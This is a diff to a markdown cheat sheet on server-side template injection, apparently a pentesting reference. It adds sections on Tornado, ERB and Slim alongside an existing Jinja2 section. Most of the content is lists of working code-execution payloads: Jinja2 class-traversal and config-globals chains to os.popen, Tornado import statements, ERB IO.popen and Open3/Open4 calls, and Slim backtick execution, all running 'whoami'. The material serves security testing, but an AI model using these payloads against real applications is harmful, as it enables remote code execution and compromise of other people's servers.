@@ -33,7 +33,7 @@ a user initiates a request to the controller -> controller uses the model to gat
 
 ### <mark style="color:yellow;">1. Python - Jinja 2</mark>
 
-If you find server-side template injection in the Jinja 2 template engine the severity of your finding depends on what python classes you have access to.
+If you find server-side template injection in the Jinja 2 template engine the severity of your finding depends on what Python classes you have access to.
 
 **Vulnerable code snippet:**
 
@@ -51,10 +51,65 @@ If you find server-side template injection in the Jinja 2 template engine the se
 * \{{\[].\_\_class\_\_.\_\_base\_\_\}}  -> get the root object on an empty array.
 * \{{\[].\_\_class\_\_.\_\_mro\[1]\_\_subclasses\_\_()\}}  -> list all the subclasses of a class.
 
-<mark style="color:green;">For Code Execution:</mark>
+<mark style="color:green;">**For Code Execution:**</mark>
 
 * \{{\[].\_\_class\_\_.\_\_mro\_\_\[1].\_\_subclasses\_\_()\[-3]\('whoami',shell=True,stdout=-1).communicate()\[0]\}}
 * \{{config.\_\_class\_\_.\_\_init\_\_.\_\_globals\_\_\['os'].popen('whoami').read()\}}
 
 ### <mark style="color:yellow;">2. Python - Tornado</mark>
+
+Tornado is a scalable, non-blocking web server and web application framework written in Python.
+
+**Vulnerable code snippet:**
+
+<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+
+**SSTI testing payloads:**
+
+Any library available to Python is also available to the template engine, which means you can import a Python library and call it.
+
+<mark style="color:green;">**For Code Execution:**</mark>
+
+* { % import os %\}\{{ os.popen("whoami").read() \}}
+* { % import subprocess %\}\{{ subprocess.Popen('whoami',shell=True,stdout=-1).communicate()\[0]\}}
+
+### <mark style="color:yellow;">3. Ruby- ERB</mark>
+
+Looks like a plain-text document interspersed with tags containing Ruby code.
+
+**Vulnerable code snippet:**
+
+<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+
+**ERB tags for embedding code:**
+
+* <% code %>   -> executes ruby code.
+* <%= code %> -> executes ruby code and returns the results.
+
+**SSTI testing payloads:**
+
+* <%= 7 \* 7 %>   -> 49
+* <%= 'whoami' %>
+* <%= IO.popen('whoami').readlines() %>
+* <%= require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
+* <%= require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
+
+### <mark style="color:yellow;">4. Ruby - Slim</mark>
+
+Fast, lightweight templating engine with support for Rails 3 and later.
+
+Like the ERB template engine, you can execute any ruby command you want.
+
+**Vulnerable code snippet:**
+
+<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+
+**SSTI testing payloads:**
+
+To execute a shell command just wrap your command in backticks.
+
+* <mark style="color:green;">#{code}</mark>
+* \#{ 'whoami' }
+
+### <mark style="color:yellow;">5. Java - Freemarker</mark>
 
